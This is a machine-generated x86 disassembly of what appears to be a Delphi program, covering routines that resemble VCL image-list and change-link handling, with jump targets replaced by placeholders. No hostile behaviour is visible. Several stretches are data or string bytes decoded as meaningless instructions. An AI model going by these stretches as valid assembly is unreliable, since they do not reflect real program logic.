cmpsd [ esi ] [ edi ]
inc esp
add al bh
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + ebp * 4 ] cl
inc esp
add [ eax ] ah
test al 0x44
add [ eax + ebp * 4 ] dh
inc esp
add [ eax - 0x58 ] cl
inc esp
add [ eax + ebp * 4 + 0x44 ] cl
add [ eax - 0x58 ] dl
inc esp
add [ eax + ebp * 4 + 0x44 ] dl
add [ eax - 0x58 ] bl
inc esp
add [ eax + ebp * 4 + 0x44 ] bl
add [ eax - 0x58 ] ah
inc esp
add [ eax + ebp * 4 + 0x44 ] ah
add [ eax - 0x58 ] ch
inc esp
add [ eax + ebp * 4 + 0x44 ] ch
add [ eax - 0x58 ] dh
inc esp
add [ eax + ebp * 4 + 0x44 ] dh
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x99e85653
xchg esp eax
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
add [ ebx * 4 - 0x630fffbf ] bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sub_44a17c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d78
test bl bl
jle r-xdata
mov edx esi
call sub_44a590
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_44a1ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41988c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44a294
sub_44a220
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a1b0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413964
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413af0
sub_44a268
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043ec
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404034
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44a590
mov edx ebx
mov eax esi
call sub_44a570
sub_44a2bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44a294
sub_44a2e8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45f420
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40348c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419e04
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43b034
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a340
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45f448
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40348c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419e20
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43b034
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a398
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41942c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44a51c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a404
push ebx
push esi
push edi
call sub_40361c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403290
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413b5c
call sub_403290
mov eax [ edi + 0x30 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419478
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
sub_44a454
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44a49c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413ad0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov edx edi
call sub_44a220
sub_44a4e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44c244
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44c288
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4194fc
sub_44a528
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419748
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44a590
sub_44a570
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413918
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4194fc
pop esi
pop ebx
retn
sub_44a590
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413bb8
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44a5ac
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44a614
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4552f8
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44dae0
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44aebc
mov edx ebp
call sub_44af1c
inc eax
je r-xdata
sub_44a6a0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44a6c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44a6e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44ab30
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44ab30
sub_44a878
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419d34
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a8cc
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403290
mov eax [ esi + 0x9c ]
call sub_403290
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a17c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cdfc
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_44a91c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414114
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44a9c8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44aa28
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44ab30
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44ac68
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44acc8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44ad24
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44ad88
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a9c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043ec
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404034
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44aa28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44ab20
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44a4e0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44a4cc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44aa28
sub_44ab30
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44aba8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043ec
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404034
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413a74
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413a74
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_44ac10
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44ac68
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043ec
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404034
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44acc8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44ad24
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44ad88
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413a74
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_44ade8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043ec
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419984
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44a9c8
sub_44ae34
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44ae5c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44a2e8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44aa28
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44aef0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4150d4
mov edi eax
mov eax esi
call sub_44ddcc
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44af1c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44af60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44af85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44af8c
retn
sub_44afc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax - 0x4fefffbc ] dh
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
aam 0xca
inc esp
add [ ecx ] al
add bh bh
dec [ eax ]

sub_44b00e
inc esp
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
or al 0xb1
inc esp
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + esi * 4 ] bl
inc esp
inc esp
add [ eax + eax * 8 - 0x3bd3ffbc ] ah
inc esp
add ah ah
mov edi 0x987c0044
inc ecx
add [ eax - 0x69 ] cl
inc ecx
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al bl
mov cl 0x44
add al bl
mov ebx 0xb2e40044
inc esp
add al ah
enter 0x44 0x6c
leave
inc esp
add ah ah
rol [ eax + eax + 0x1 ] 0x0
out dx eax
push esp
rol [ eax + eax + 0x10 ] 0x54
inc ebx
jne r-xdata
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add [ eax - 0x50 ] dh
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
mov eax 0x20000000
retn
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x7000408d
mov cl 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] dl
inc esp
add [ eax - 0x4f ] bl
inc esp
add [ eax ] ch
add [ eax ] al
inc eax
and eax [ ecx ]
pushfd
fwait
inc ecx
mov cl 0x44
popad
jb r-xdata
ror [ ebx - 0x1dc6173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x617f08c ] 0x83
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x24
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] dh
inc esp
outsb
je r-xdata
mov eax eax
je r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xb074c08b
push esp
inc esp
jb r-xdata
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
js r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
jo r-xdata
ja r-xdata
add [ edi ] al
jae r-xdata
inc esp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
sub_44b1d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41942c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
